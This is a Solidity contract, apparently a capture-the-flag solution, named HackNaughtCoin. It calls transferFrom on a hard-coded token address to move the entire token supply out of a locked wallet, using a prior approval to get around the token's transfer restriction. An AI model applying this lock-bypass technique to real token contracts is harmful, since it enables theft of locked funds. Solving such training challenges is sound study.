// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

 contract NaughtCoin {

     function approve(address, uint256) public returns (bool) {}
     function transferFrom(address, address, uint256) public returns (bool) {}
  }

contract HackNaughtCoin {
    //do approval, for this contract address after deployment, in console
    // or just approve own wallet address and transferFrom all from within the console
    NaughtCoin originalContract = NaughtCoin(0x591D8B95c4dD262a2252C21EC5FE8E4409EE8c64);
    uint256 public INITIAL_SUPPLY = 1000000 * (10**uint256(18));

    function transferAll() public {
        originalContract.transferFrom(0x9eA8B00029Cf9C1B57483ecadCaFC94638fe7B17, address(this), INITIAL_SUPPLY);
    }
}